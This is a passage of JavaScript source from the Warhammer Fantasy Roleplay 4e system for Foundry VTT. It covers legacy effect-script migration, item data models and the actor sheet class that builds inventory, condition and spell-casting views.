        trigger : _triggerMigrations(flags.effectTrigger),
    };

    if (flags.effectTrigger == "targetPrefillDialog")
    {
        foundry.utils.setProperty(newScript, "options.dialog.targeter", true);
    }

    if (flags.script)
    {
        // Previously scripts could reference the source test with a janky {{path}} statement
        // Now, all scripts have a `this.effect` reference, which has a `sourceTest` getter
        let script = flags.script;
        let regex = /{{(.+?)}}/g;
        let matches = [...script.matchAll(regex)];
        matches.forEach(match => {
            script = script.replace(match[0], `this.effect.sourceTest.data.result.${match[1]}`);
        });
        newScript.script = script;

        
        if (flags.effectTrigger == "prefillDialog")
        {
            // Old prefill triggers always ran for every dialog with conditional logic inside to add modifiers or not
            // To reflect that, migrated prefill tiggers need to always be active in the dialog
            foundry.utils.setProperty(newScript, "options.dialog.activateScript", "return true");
        }

    }
    else if (flags.effectTrigger == "dialogChoice")
    {
        newScript.label = flags.effectData.description || newScript.label;
        newScript.script = `
        args.prefillModifiers.modifier += ${flags.effectData.modifier || 0};
        args.prefillModifiers.slBonus += ${flags.effectData.SLBonus || 0};
        args.prefillModifiers.successBonus += ${flags.effectData.successBonus || 0};
        `;
        // Missing difficultyBonus?
    }
    if (newScript.trigger)
    {
        flags.scriptData.push(newScript);
    }

    switch(flags.effectApplication)
    {
        case "actor":
            flags.applicationData.type = "document";                
            flags.applicationData.documentType = "Actor";                
            flags.applicationData.equipTransfer = false;
            break;
        case "item":
            flags.applicationData.type = "document";                
            flags.applicationData.documentType = "Item";                
            break;
        case "equipped":
            flags.applicationData.type = "document";                
            flags.applicationData.documentType = "Actor";  
            flags.applicationData.equipTransfer = true;
            break;
        case "apply" : 
            flags.applicationData.type = "target";                
            break;
        case "damage" : 
            flags.applicationData.type = "document"; // Not sure about this
            flags.applicationData.documentType = "Item";
            break;
    }

    if (flags.itemChoice)
    {
        flags.applicationData.filter = flags.itemChoice;
    }
    if (flags.promptChoice)
    {
        flags.applicationData.prompt = true;
    }

    
    flags._legacyData = {
        effectApplication : flags.effectApplication,
        effectTrigger : flags.effectTrigger,
        preventDuplicateEffects : flags.preventDuplicateEffects,
        script : flags.script
    };
    delete flags.effectApplication;
    delete flags.effectTrigger;
    delete flags.preventDuplicateEffects;
    delete flags.script;
}

function _triggerMigrations(trigger)
{
    let migrations = {
        "invoke" : "manual",
        "oneTime" : "immediate",
        "addItems" : "immediate",
        "dialogChoice" : "dialog",
        "prefillDialog" : "dialog",
        "targetPrefillDialog" : "dialog"
    };
    return migrations[trigger] || trigger;
}

var WFRP4eSheetMixin$1 = WFRP4eSheetMixin = (cls) => class extends cls 
{
    // Shared listeners between different document sheets 

    _getId(ev) 
    {
        return this._getDataAttribute(ev, "id");
    }
    
    _getIndex(ev) 
    {
        return Number(this._getDataAttribute(ev, "index"));
    }

    _getKey(ev) 
    {
        return this._getDataAttribute(ev, "key");
    }

    _getType(ev) 
    {
        return this._getDataAttribute(ev, "type");
    }

    _getPath(ev) 
    {
        return this._getDataAttribute(ev, "path");
    }

    _getCollection(ev) 
    {
        return this._getDataAttribute(ev, "collection") || "items";
    }

    _getUUID(ev)
    {
        return this._getDataAttribute(ev, "uuid");
    }


    /**
     * Search for an HTML data property, specified as data-<property>
     * First search target of the event, then search in parent properties
     * 
     * @param {Event} ev Event triggered
     * @param {String} property data-<property> being searched for
     * @returns 
     */
    _getDataAttribute(ev, property)
    {
        let value = ev.target.dataset[property];

        if (!value) 
        {
            const parent = $(ev.target).parents(`[data-${property}]`);
            if (parent) 
            {
                value = parent[0]?.dataset[property];
            }
        }
        return value;
    }

    _getDocument(event)
    {
        let id = this._getId(event);
        let collection = this._getCollection(event);
        let uuid = this._getUUID(event);

        return (uuid ? fromUuidSync(uuid) : this.object[collection].get(id));
    }

    async _onEffectCreate(ev) 
    {
        let type = ev.currentTarget.dataset.category;
        let effectData = { name: game.i18n.localize("New Effect"), icon: "icons/svg/aura.svg" };
        if (type == "temporary") 
        {
            effectData["duration.rounds"] = 1;
        }
        else if (type == "disabled") 
        {
            effectData.disabled = true;
        }

        // If Item effect, use item name for effect name
        if (this.object.documentName == "Item")
        {
            effectData.name = this.object.name;
            effectData.icon = this.object.img;
        }
        this.object.createEmbeddedDocuments("ActiveEffect", [effectData]).then(effects => effects[0].sheet.render(true));
    }
};

let fields$B = foundry.data.fields;

 class BaseItemModel extends foundry.abstract.DataModel 
 {
 
    //  allowedConditions = [];  // What condition effects can exist on the item
    //  allowedEffectApplications = Object.keys(game.wfrp4e.config.effectApplications);
    //  effectApplicationOptions = {};
 
 
     get id () 
     {
         return this.parent.id;
     }
 
     static defineSchema() 
     {
        return {
            description : new fields$B.SchemaField({
                value: new fields$B.StringField()
            }),
            gmdescription : new fields$B.SchemaField({
                value: new fields$B.StringField()
            }),
        } 
     }
 
     allowCreation()
     {
         if (this.parent.actor)
         {
             return this.parent.actor.system.itemIsAllowed(this.parent);
         }
         else 
         {
             return true;
         }
     }
 

     // *** Creation ***
     async preCreateData(data, options, user)
     {
        let preCreateData = {};
        if (!data.img || data.img == "icons/svg/item-bag.svg")
            preCreateData.img = "systems/wfrp4e/icons/blank.png";

        return preCreateData;
     }

     createChecks(data, options, user)
     {
         
     }

     // *** Updates *** 
     async preUpdateChecks(data, options, user)
     {

     }
 
     updateChecks(data, options, user)
     {
        
     }


     // *** Deletions ***
     async preDeleteChecks(options, user)
     {

     }

     deleteChecks(options, user)
     {

     }




 
    /**
      * @abstract
      */
     computeBase() 
     {

     }
 
    /**
      * @abstract
      */
     computeDerived() 
     {

     }

     /**
      * @abstract
      */
     computeOwned()
     {
     }

     getOtherEffects()
     {
         return [];
     }

    get skillToUse() {
        return this.getSkillToUse(this.parent.actor)
    }

    get isMagical() {
        return false;
    }

    // These effects don't need to be posted to chat via a test to be applied
    get testIndependentEffects()
    {
        return this.parent.targetEffects.concat(this.parent.areaEffects).filter(e => e.testIndependent);
    }

  /**
   * Sometimes a weapon isn't being used by its owning actor (namely: vehicles)
   * So the simple getter BaseItemModel#skillToUse isn't sufficient, we need to provide
   * an actor to use their skills instead
   * 
   * @abstract
   * @param {Object} actor Actor whose skills are being used
   */
    getSkillToUse(actor)
    {
        
    }


    async expandData(htmlOptions) {
        htmlOptions.async = true;
        const data = this.parent.toObject().system;
        data.properties = [];
        data.other = [];
        data.description.value = data.description.value || "";
        data.description.value = await TextEditor.enrichHTML(data.description.value, htmlOptions);
        data.manualScripts = this.parent.manualScripts;
        data.independentEffects = this.testIndependentEffects;
        return data;
      }

    /**
     * @abstract
     */
    chatData()
    {
        
    }
 
    //  computeOwnerDerived() 
    //  {
         
    //  }
 
    //  computeOwnerBase() 
    //  {

    //  }
 
     /**
      * 
      */
    //  effectIsApplicable(effect)
    //  {
    //      return !effect.disabled;
    //  }
 
     // If an item effect is disabled it should still transfer to the actor, so that it's visibly disabled
     shouldTransferEffect(effect)
     {
         return true;
     }
 
 }

foundry.data.fields;

class GenericAspectModel extends BaseItemModel
{
    static placement = "talents"
    static label = "Aspect"
    static plural = "Aspects"

    get placement() 
    {
        return this.constructor.placement;
    }

    get label() 
    {
        return this.constructor.label;
    }
    
    get pluralLabel() 
    {
        return this.constructor.plural;
    }

    get detailsPartial()
    {
        return 'aspectDetails';
    }

    /**
     * Whether the Aspect can be "used" or not. Usage may – depending on Aspect – mean Rolling, initiating a Test,
     * or doing something else entirely.
     *
     * @returns {boolean}
     * @public
     */
    get usable()
    {
        return false;
    }

    /**
     * Method which serves as a public wrapper for _performUsage() method, while also calling a pre-use and post-use hook.
     *
     * @param {{}} options
     *
     * @returns {Promise<TestWFRP|Roll|null>}
     * @public
     */
    async use(options = {})
    {
        if (!this.usable)
            return null;

        if (!Hooks.call('wfrp4e:beforeUseAspect', this.parent, options))
            return null;

        const result = await this._performUsage(options);

        Hooks.callAll('wfrp4e:afterUseAspect', this.parent, result, options);

        return result;
    }

    /**
     * Method which should implement entire logic behind "using an Aspect" such as rolling or initiating a Test.
     *
     * Should return either object of TestWFRP class, object of Roll class or null if Aspect is not rollable.
     *
     * @returns {Promise<TestWFRP|Roll|null>}
     * @protected
     */
    async _performUsage({} = {})
    {
        return null;
    }
}

/**
 * Provides the data and general interaction with Actor Sheets - Abstract class.
 *
 * ActorSheetWfrp4e provides the general interaction and data organization shared among all 
 * actor sheets, as this is an abstract class, inherited by either Character, NPC, or Creature
 * specific actor sheet classes. When rendering an actor sheet, getData() is called, which is
 * a large and key that prepares the actor data for display, processing the raw data
 * and items and compiling them into data to display on the sheet. Additionally, this class
 * contains all the main events that respond to sheet interaction in activateListeners().
 *
 * @see   ActorWfrp4e - Data and main computation model (this.actor)
 * @see   ActorSheetWfrp4eCharacter - Character sheet class
 * @see   ActorSheetWfrp4eNPC - NPC sheet class
 * @see   ActorSheetWfrp4eCreature - Creature sheet class
 *
 * @property {ActorWfrp4e} actor
 */
class ActorSheetWfrp4e extends WFRP4eSheetMixin$1(ActorSheet) {

  static get defaultOptions() {
    const options = super.defaultOptions;
    options.tabs = [{ navSelector: ".tabs", contentSelector: ".content", initial: "main" }];
    options.width = 576;
    options.scrollY = [".save-scroll"];
    return options;
  }

  /**
   * Overrides the default ActorSheet.render to add lity.
   * 
   * This adds scroll position saving support, as well as tooltips for the
   * custom buttons.
   * 
   * @param {bool} force      used upstream.
   * @param {Object} options  used upstream.
   */
  async _render(force = false, options = {}) {
    await super._render(force, options);

    // Add Tooltips
    this.element.find(".close").attr({"data-tooltip" : game.i18n.localize("SHEET.Close"), "data-tooltip-direction" : "UP"});
    this.element.find(".configure-sheet").attr({"data-tooltip" : game.i18n.localize("SHEET.Configure"), "data-tooltip-direction" : "UP"});
    this.element.find(".configure-token").attr({"data-tooltip" : game.i18n.localize("SHEET.Token"), "data-tooltip-direction" : "UP"});
    this.element.find(".import").attr({"data-tooltip" : game.i18n.localize("SHEET.Import"), "data-tooltip-direction" : "UP"});

    WFRP_Utility.replacePopoutTokens(this.element); // Opposed attackers show as tokens, replace popout versions with normal
    WFRP_Utility.addLinkSources(this.element);

    this._refocus(this._element);

  }

  // /**
  //  * Saves all the scroll positions in the sheet for setScrollPos() to use
  //  * 
  //  * All elements in the sheet that use ".save-scroll" class has their position saved to
  //  * this.scrollPos array, which is used when rendering (rendering a sheet resets all 
  //  * scroll positions by default).
  //  */
  // _saveScrollPos() {
  //   if (this.form === null)
  //     return;

  //   const html = $(this.form).parent();
  //   this.scrollPos = [];
  //   let lists = $(html.find(".save-scroll"));
  //   for (let list of lists) {
  //     this.scrollPos.push($(list).scrollTop());
  //   }
  // }

  // /**
  //  * Sets all scroll positions to what was saved by saveScrollPos()
  //  * 
  //  * All elements in the sheet that use ".save-scroll" class has their position set to what was
  //  * saved by saveScrollPos before rendering. 
  //  */
  // _setScrollPos() {
  //   if (this.scrollPos) {
  //     const html = $(this.form).parent();
  //     let lists = $(html.find(".save-scroll"));
  //     for (let i = 0; i < lists.length; i++) {
  //       $(lists[i]).scrollTop(this.scrollPos[i]);
  //     }
  //   }
  // }

  _refocus(html) {
    try {
      let element;
      if (this.saveFocus)
        element = html.find(`input[${this.saveFocus}]`)[0];

      if (element) {
        element.focus();
        element.select();
      }
    }
    catch (e) {
      WFRP_Utility.log("Could not refocus tabbed element on character sheet");
    }
  }

  /**
   * Provides the data to the template when rendering the actor sheet
   * 
   * This is called when rendering the sheet, where it calls the base actor class
   * to organize, process, and prepare all actor data for display. See ActorWfrp4e.prepare()
   * 
   * @returns {Object} sheetData    Data given to the template when rendering
   */
  async getData() {
    const sheetData = await super.getData();
    sheetData.system = sheetData.actor.system; // project system data so that handlebars has the same name and value paths

    sheetData.items = this.constructItemLists(sheetData);
    this.formatArmourSection(sheetData);

    this._addEncumbranceData(sheetData);

    this.filterActiveEffects(sheetData);
    this.addConditionData(sheetData);

    sheetData.attacker = this.actor.attacker;
    sheetData.vehicle = this.actor.system.vehicle;
    sheetData.portStayEvents = game.wfrp4e.tables.findTable("port-stay-events");
    sheetData.shipboardEvents = game.wfrp4e.tables.findTable("shipboard-events");

    if (this.actor.type != "vehicle") {
      sheetData.effects.system = game.wfrp4e.utility.getSystemEffects();
    }
    else 
    {
      sheetData.effects.system = game.wfrp4e.utility.getSystemEffects(true);
    }

    sheetData.enrichment = await this._handleEnrichment();

    return sheetData;
  }

  async _handleEnrichment()
  {
      let enrichment = {};
      enrichment["system.details.biography.value"] = await TextEditor.enrichHTML(this.actor.system.details.biography.value, {async: true, secrets: this.actor.isOwner, relativeTo: this.actor});
      enrichment["system.details.gmnotes.value"] = await TextEditor.enrichHTML(this.actor.system.details.gmnotes.value, {async: true, secrets: this.actor.isOwner, relativeTo: this.actor});

      return foundry.utils.expandObject(enrichment)
  }


  constructItemLists(sheetData) {

    let items = {};

    items.skills = {
      basic: sheetData.actor.getItemTypes("skill").filter(i => i.advanced.value == "bsc" && i.grouped.value == "noSpec"),
      advanced: sheetData.actor.getItemTypes("skill").filter(i => i.advanced.value == "adv" || i.grouped.value == "isSpec")
    };

    items.careers = sheetData.actor.getItemTypes("career").reverse();
    items.criticals = sheetData.actor.getItemTypes("critical");
    items.nonTrivialCriticals = items.criticals.filter(c => Number.isNumeric(c.system.wounds.value));
    items.diseases = sheetData.actor.getItemTypes("disease");
    items.injuries = sheetData.actor.getItemTypes("injury");
    items.mutations = sheetData.actor.getItemTypes("mutation");
    items.psychologies = sheetData.actor.getItemTypes("psychology");
    items.traits = sheetData.actor.getItemTypes("trait");
    items.extendedTests = sheetData.actor.getItemTypes("extendedTest");
    items.vehicleMods = sheetData.actor.getItemTypes("vehicleMod");
    items.vehicleTests = sheetData.actor.getItemTypes("vehicleTest");
    items.vehicleRoles = sheetData.actor.getItemTypes("vehicleRole");

    items.grimoire = {
      petty: sheetData.actor.getItemTypes("spell").filter(i => i.lore.value == "petty" || i.lore.value == game.i18n.localize("WFRP4E.MagicLores.petty")),
      lore: sheetData.actor.getItemTypes("spell").filter(i => (i.lore.value != "petty" && i.lore.value != game.i18n.localize("WFRP4E.MagicLores.petty")) || !i.lore.value)
    };

    items.prayers = {
      blessings: sheetData.actor.getItemTypes("prayer").filter(i => i.prayerType.value == "blessing"),
      miracles: sheetData.actor.getItemTypes("prayer").filter(i => i.prayerType.value == "miracle" || !i.prayerType.value)
    };

    items.equipped = {
      weapons: sheetData.actor.getItemTypes("weapon").filter(i => i.isEquipped),
      armour: sheetData.actor.getItemTypes("armour").filter(i => i.isEquipped)
    };

    items.aspects = {
      talents : {}, 
      effects : {}, 
      combat : {}
    };
    sheetData.actor.items.contents.filter(i => i.system instanceof GenericAspectModel).forEach(item => {
        if (items.aspects[item.system.placement][item.system.pluralLabel])
        {
          items.aspects[item.system.placement][item.system.pluralLabel].push(item);
        }
        else 
        {
          items.aspects[item.system.placement][item.system.pluralLabel] = [item];
        }
    });

    items.inventory = this.constructInventory(sheetData);

    items.talents = this._consolidateTalents();

    this._sortItemLists(items);

    items.skills.basic = items.skills.basic.sort(WFRP_Utility.nameSorter);
    items.skills.advanced = items.skills.advanced.sort(WFRP_Utility.nameSorter);

    return items
  }

  constructInventory(sheetData) {

    let collapsed = this.actor.getFlag("wfrp4e", "sheetCollapsed");
    // Inventory object is for the Trappings tab - each sub object is for an individual inventory section
    const categories = {
      weapons: {
        label: game.i18n.localize("WFRP4E.TrappingType.Weapon"), // Label - what is displayed in the inventory section header
        items: sheetData.actor.getItemTypes("weapon"), // Array of items in the sectio.filter(i => !i.location.value)n
        toggle: true,                                 // Is there a toggle in the section? (Equipped, worn, etc.)
        toggleName: game.i18n.localize("Equipped"),   // What is the name of the toggle in the header
        show: false,                                  // Should this section be shown (if an item exists in this list, it is set to true)
        collapsed : collapsed?.weapons,
        dataType: "weapon"                            // What type of FVTT Item is in this section (used by the + button to add an item of this type)
      },
      armor: {
        label: game.i18n.localize("WFRP4E.TrappingType.Armour"),
        items: sheetData.actor.getItemTypes("armour"),
        toggle: true,
        toggleName: game.i18n.localize("Worn"),
        show: false,
        collapsed : collapsed?.armor,
        dataType: "armour"
      },
      ammunition: {
        label: game.i18n.localize("WFRP4E.TrappingType.Ammunition"),
        items: sheetData.actor.getItemTypes("ammunition"),
        show: false,
        collapsed : collapsed?.ammunition,
        dataType: "ammunition"
      },
      clothingAccessories: {
        label: game.i18n.localize("WFRP4E.TrappingType.ClothingAccessories"),
        items: sheetData.actor.getItemTypes("trapping").filter(i => i.trappingType.value == "clothingAccessories"),
        toggle: true,
        toggleName: game.i18n.localize("Worn"),
        show: false,
        collapsed : collapsed?.clothingAccessories,
        dataType: "trapping"
      },
      booksAndDocuments: {
        label: game.i18n.localize("WFRP4E.TrappingType.BooksDocuments"),
        items: sheetData.actor.getItemTypes("trapping").filter(i => i.trappingType.value == "booksAndDocuments"),
        show: false,
        collapsed : collapsed?.booksAndDocuments,
        dataType: "trapping"
      },
      toolsAndKits: {
        label: game.i18n.localize("WFRP4E.TrappingType.ToolsKits"),
        items: sheetData.actor.getItemTypes("trapping").filter(i => i.trappingType.value == "toolsAndKits" || i.trappingType.value == "tradeTools"),
        show: false,
        collapsed : collapsed?.toolsAndKits,
        dataType: "trapping"
      },
      foodAndDrink: {
        label: game.i18n.localize("WFRP4E.TrappingType.FoodDrink"),
        items: sheetData.actor.getItemTypes("trapping").filter(i => i.trappingType.value == "foodAndDrink"),
        show: false,
        collapsed : collapsed?.foodAndDrink,
        dataType: "trapping"
      },
      drugsPoisonsHerbsDraughts: {
        label: game.i18n.localize("WFRP4E.TrappingType.DrugsPoisonsHerbsDraughts"),
        items: sheetData.actor.getItemTypes("trapping").filter(i => i.trappingType.value == "drugsPoisonsHerbsDraughts"),
        show: false,
        collapsed : collapsed?.drugsPoisonsHerbsDraughts,
        dataType: "trapping"
      },
      misc: {
        label: game.i18n.localize("WFRP4E.TrappingType.Misc"),
        items: sheetData.actor.getItemTypes("trapping").filter(i => i.trappingType.value == "misc" || !i.trappingType.value),
        show: true,
        collapsed : collapsed?.misc,
        dataType: "trapping"
      },
      cargo: {
        label: game.i18n.localize("WFRP4E.TrappingType.Cargo"),
        items: sheetData.actor.getItemTypes("cargo"),
        show: false,
        collapsed : collapsed?.cargo,
        dataType: "cargo"
      }
    };

    // Money and ingredients are not in inventory object because they need more customization - note in actor-inventory.html that they do not exist in the main inventory loop
    const ingredients = {
      label: game.i18n.localize("WFRP4E.TrappingType.Ingredient"),
      items: sheetData.actor.getItemTypes("trapping").filter(i => i.trappingType.value == "ingredient"),
      show: false,
      collapsed : collapsed?.ingredients,
      dataType: "trapping"
    };
    const money = {
      items: sheetData.actor.getItemTypes("money"),
      total: 0,     // Total coinage value
      show: true,
      collapsed : false
    };
    const containers = {
      items: sheetData.actor.getItemTypes("container"),
      show: false
    };
    const misc = {};
    let inContainers = []; // inContainers is the temporary storage for items within a container


    if (sheetData.actor.hasSpells || sheetData.actor.type == "vehicle")
      inContainers = this._filterItemCategory(ingredients, inContainers);
    else
      categories.misc.items = categories.misc.items.concat(ingredients.items);

    // Allow 3rd party modules to expand Inventory by adding new categories
    Hooks.callAll("wfrp4e:constructInventory", this, categories, collapsed);

    for (let itemCategory in categories)
      inContainers = this._filterItemCategory(categories[itemCategory], inContainers);

    inContainers = this._filterItemCategory(money, inContainers);
    inContainers = this._filterItemCategory(containers, inContainers);

    // Add names of containers to item.location object. Used for ammo selection
    inContainers.forEach(i => {
      const container = this.actor.getItemTypes("container").find(c => c.id === i.location.value);
      i.location.name = container?.name || false;
    });

    misc.totalShieldDamage = categories["weapons"].items.reduce((prev, current) => prev += current.damageToItem.shield, 0);

    money.total = money.items.reduce((prev, current) => { return prev + (current.coinValue.value * current.quantity.value) }, 0);

    categories.misc.show = true;

    // ******************************** Container Setup ***********************************

    for (var cont of this.actor.getItemTypes("container")) // For each container
    {
      // All items referencing (inside) that container
      var itemsInside = inContainers.filter(i => i.location.value == cont.id);
      cont.system.carrying = itemsInside.filter(i => i.type != "container");    // cont.system.carrying -> items the container is carrying
      cont.system.packsInside = itemsInside.filter(i => i.type == "container"); // cont.system.packsInside -> containers the container is carrying
      cont.system.carries.current = itemsInside.reduce(function (prev, cur) {   // cont.system.holding -> total encumbrance the container is holding
        return Number(prev) + Number(cur.encumbrance.total);
      }, 0);
      cont.system.carries.current = Math.floor(cont.system.carries.current * 10) / 10;
      cont.collapsed=this.actor.getFlag("wfrp4e", "sheetCollapsed")?.[cont.id];
    }

    return {
      categories,
      ingredients,
      money,
      containers,
      misc
    }
  }

  _filterItemCategory(category, itemsInContainers) {
    itemsInContainers = itemsInContainers.concat(category.items.filter(i => !!i.location?.value));
    category.items = category.items.filter(i => !i.location?.value);
    category.show = category.items.length > 0;
    return itemsInContainers
  }

  addConditionData(sheetData) {
    try {
      let conditions = foundry.utils.duplicate(game.wfrp4e.config.statusEffects).map(e => new EffectWfrp4e(e));
      let currentConditions = this.actor.conditions;
      delete conditions.splice(conditions.length - 1, 1);
      
      for (let condition of conditions) {
        let owned = currentConditions.find(e => e.conditionId == condition.conditionId);
        if (owned) {
          condition.existing = true;
          condition.flags.wfrp4e.value = owned.conditionValue;
        }
        else if (condition.isNumberedCondition) {
          condition.flags.wfrp4e.value = 0;
        }
      }
      sheetData.effects.conditions = conditions;
    }
    catch (e)
    {
      ui.notifications.error("Error Adding Condition Data: " + e);
    }
  }

  filterActiveEffects(sheetData) {
    sheetData.effects = {};
    sheetData.effects.conditions = [];
    sheetData.effects.temporary = [];
    sheetData.effects.passive = [];
    sheetData.effects.disabled = [];

    for (let e of Array.from(this.actor.allApplicableEffects(true)))
    {
      if (!e.show)
        continue
      if (e.isCondition) sheetData.effects.conditions.push(e);
      else if (e.disabled) sheetData.effects.disabled.push(e);
      else if (e.isTemporary) sheetData.effects.temporary.push(e);
      else sheetData.effects.passive.push(e);
    }

    sheetData.effects.passive = this._consolidateEffects(sheetData.effects.passive);
    sheetData.effects.temporary = this._consolidateEffects(sheetData.effects.temporary);
    sheetData.effects.disabled = this._consolidateEffects(sheetData.effects.disabled);
  }

  // Recursively go through the object and sort any arrays found
  _sortItemLists(items) {
    for (let prop in items) {
      if (Array.isArray(items[prop]))
        items[prop] = items[prop].sort((a, b) => (a.sort || 0) - (b.sort || 0));
      else if (typeof items == "object")
        this._sortItemLists(items[prop]);
    }
  }
  _consolidateEffects(effects) {
    let consolidated = [];
    for (let effect of effects) {
      let existing = consolidated.find(e => e.name == effect.name);
      if (!existing)
        consolidated.push(effect);
    }
    for (let effect of consolidated) {
      let count = effects.filter(e => e.name == effect.name).length;
      effect.count = count;
    }
    return consolidated
  }

  _consolidateTalents() {
    let talents = this.actor.getItemTypes("talent");
    let consolidated = [];
    for (let talent of talents) {
      let existing = consolidated.find(t => t.name == talent.name);
      if (!existing)
        consolidated.push(talent);
    }
    return consolidated
  }


  formatArmourSection(sheetData) {
    let AP = sheetData.system.status.armour;

    // Change out hit locations if using custom table
    let table = game.wfrp4e.tables.findTable(sheetData.system.details.hitLocationTable.value);
    for (let loc in AP) {
      if (loc == "shield" || loc == "shieldDamage")
        continue
      if (table)
      {
        try {
          let result  = table.results.find(r => r.getFlag("wfrp4e", "loc") == loc);
          if (result)
          AP[loc].label = game.i18n.localize(result.text);
          else
          AP[loc].show = false;
        }
        catch(e)
        {
          ui.notifications.error("Error formatting armour section using Hit Location Table, using fallback implementation");
          WFRP_Utility.log("Hit Location Format Error: " + e, true);
          AP[loc].label = game.i18n.localize(game.wfrp4e.config.locations[loc]);
        }
      }
      else if (game.wfrp4e.config.locations[loc]) // fallback implementation
      {
        AP[loc].label = game.i18n.localize(game.wfrp4e.config.locations[loc]);
      }
    }
  }

  _addEncumbranceData(sheetData) {
    if (this.type != "vehicle")
      sheetData.system.status.encumbrance.pct = Math.min((sheetData.system.status.encumbrance.current / sheetData.system.status.encumbrance.max * 100), 100);
  }

  addMountData(data) {
    try {
      if (!this.actor.mount)
        return

      data.mount = this.actor.mount.data;
      if (data.mount.system.status.wounds.value == 0)
        this.actor.status.mount.mounted = false;
      if (data.actor.status.mount.isToken)
        data.mount.sceneName = game.scenes.get(data.actor.system.status.mount.tokenData.scene).name;
    }
    catch (e) {
      console.error(this.actor.name + ": Failed to get mount data: " + e.message);
    }
  }

  /**
   * Takes the user-entered hp value and interprets it as relative or absolute
   * and modifies the hp accordingly. 
   * 
   * Takes an either relative (+12 or -5) or an absolute value (12 or 5), interprets
   * it, and processes it with the actor's hp value.
   * 
   * @param {String} value   user entered value 
   */
  modifyWounds(value) {
    let sign = value.split('')[0]; // Sign is the first character entered
    if (sign === "+" || sign === "-") // Relative
      return this.actor.modifyWounds(parseInt(value))
    else                            // Absolute
      return this.actor.setWounds(parseInt(value));
  }

  /**
 * Display a dialog for the user to choose casting or channelling.
 *
 * When clicking on a spell, the user will get an option to Cast or Channel that spell
 * Each option leads to their respective "setup" .
 *
 * @param {Object} spell     The spell item clicked on, petty spells will automatically be Casted, without the option to channel.
 *
 */
  spellDialog(spell, options = {}) {
    // Do not show the dialog for Petty spells, just cast it.
    if (spell.lore.value == "petty" || spell.lore.value == game.i18n.localize("WFRP4E.MagicLores.petty"))
      this.actor.setupCast(spell, options).then(setupData => {
        this.actor.castTest(setupData);
      });
    else {
        new Dialog({
          title: game.i18n.localize("DIALOG.CastOrChannel"),
          content: `<div class="cast-channel-dialog selection"> 
                    <p>${game.i18n.localize("DIALOG.CastChannel")}</p> 
                    </div>`,
          buttons: {
            cast: {
              label: game.i18n.localize("Cast"),
              callback: btn => {
                this.actor.setupCast(spell, options).then(setupData => {
                  this.actor.castTest(setupData);
                });
              }
            },
            channel: {
              label: game.i18n.localize("Channel"),
              callback: async btn => {
                let test = await this.actor.setupChannell(spell, options);
                await test.roll();
                if (test.context.channelUntilSuccess) {
                  await WFRP_Utility.sleep(200);
                  do {
                    if (test.item.cn.SL >= test.item.cn.value) {
                      break;
                    }
                    if (test.result.minormis || test.result.majormis || test.result.catastrophicmis) {
                      break;
                    }
                    test.context.messageId = null; // Clear message so new message is made
                    await test.roll();
                    await WFRP_Utility.sleep(200);
                  } while (true);
                }
              }
            }
          },
          default: 'cast'
        }).render(true);
    }
  }


  _getSubmitData(updateData = {}) {
    this.actor.overrides = {};
    let data = super._getSubmitData(updateData);
    data = foundry.utils.diffObject(foundry.utils.flattenObject(this.actor.toObject(false)), data);
    return data
  }



  /* --------------------------------------------------------------------------------------------------------- */
  /* ------------------------------------ ev Listeners and Handlers --------------------------------------- */
  /* --------------------------------------------------------------------------------------------------------- */
  /**
   * This gargatuan list is all the interactions shared between all types of sheets. Every button click and text
   * fields that require special interaction are handled here. See each ev handler for more details. 
   *
  /* --------------------------------------------------------------------------------------------------------- */

  /**
   * Activate ev listeners using the prepared sheet HTML
   * @param html {HTML}   The prepared HTML object ready to be rendered into the DOM
   */
  activateListeners(html) {
    super.activateListeners(html);

    // Item summaries - displays a customized dropdown description
    html.on('click', '.item-dropdown', this._onItemSummary.bind(this));

    // Item Properties - depending on the item property selected, display a dropdown definition, this can probably be consolidated...TODO
    html.on('click', '.melee-property-quality, .melee-property-flaw, .ranged-property-quality, .ranged-property-flaw, .armour-quality, .armour-flaw', this._expandProperty.bind(this));

    // Other dropdowns - for other clickables (range, weapon group, reach) - display dropdown helpers
    html.on('click', '.weapon-range, .weapon-group, .weapon-reach', this._expandInfo.bind(this));

    // Autoselect entire text 
    $("input[type=text]").focusin((ev) => {
      $(this).select();
      //this.focusElement = ev.target
    });

    // Everything below here is only needed if the sheet is editable
    if (!this.options.editable) return;

    html.on('click', '#configure-actor', ev => {
      new game.wfrp4e.apps.ActorSettings(this.actor).render(true);
    });


    // Use customized input interpreter when manually changing wounds 
    html.on('change', ".wounds-value", ev => {
      this.modifyWounds(ev.target.value);
    });

    html.on('click', '.item-edit', this._onItemEdit.bind(this));
    html.on('click', '.ch-value', this._onCharClick.bind(this));
    html.on('click', '.rest-icon', this._onRestClick.bind(this));
    html.on('change', '.ch-edit', this._onEditChar.bind(this));
    html.on('click', '.name-gen', this._onNameClicked.bind(this));
    html.on('mousedown', '.ap-value', this._onAPClick.bind(this));
    html.on('click', '.stomp-icon', this._onStompClick.bind(this));
    html.on('click', '.dodge-icon', this._onDodgeClick.bind(this));
    html.on('click', '.repeater', this._onRepeaterClick.bind(this));
    html.on('click', '.item-toggle', this._onItemToggle.bind(this));
    html.on('click', '.item-remove', this._onItemRemove.bind(this));
    html.on('click', '.item-delete', this._onItemDelete.bind(this));
    html.on('click', '.fist-icon', this._onUnarmedClick.bind(this));
    html.on('click', '.item-create', this._onItemCreate.bind(this));
    html.on('click', '.aggregate', this._onAggregateClick.bind(this));
    html.on('click', '.worn-container', this._onWornClick.bind(this));
    html.on('click', '.effect-toggle', this._onEffectToggle.bind(this));
    html.on('click', '.effect-title', this._onEffectEdit.bind(this));
    html.on('mousedown', '.spell-roll', this._onSpellRoll.bind(this));
    html.on('mousedown', '.trait-roll', this._onTraitRoll.bind(this));
    html.on('click', '.skill-switch', this._onSkillSwitch.bind(this));
    html.on('click', '.item-post', this._onItemPostClicked.bind(this));
    html.on('change', '.ammo-selector', this._onSelectAmmo.bind(this));
    html.on('click', '.randomize', this._onRandomizeClicked.bind(this));
    html.on('change', '.input.species', this._onSpeciesEdit.bind(this));
    html.on('click', '.effect-delete', this._onEffectDelete.bind(this));
    html.on('mousedown', '.prayer-roll', this._onPrayerRoll.bind(this));
    html.on('click', '.effect-create', this._onEffectCreate.bind(this));
    html.on('click', '.item-checkbox', this._onCheckboxClick.bind(this));
    html.on('mousedown', '.sl-counter', this._onSpellSLClick.bind(this));
    html.on('change', '.spell-selector', this._onSelectSpell.bind(this));
    html.on('click', '.dollar-icon', this._onMoneyIconClicked.bind(this));
    html.on('mousedown', '.disease-roll', this._onDiseaseRoll.bind(this));
    html.on('mousedown', '.shield-total', this._onShieldClick.bind(this));
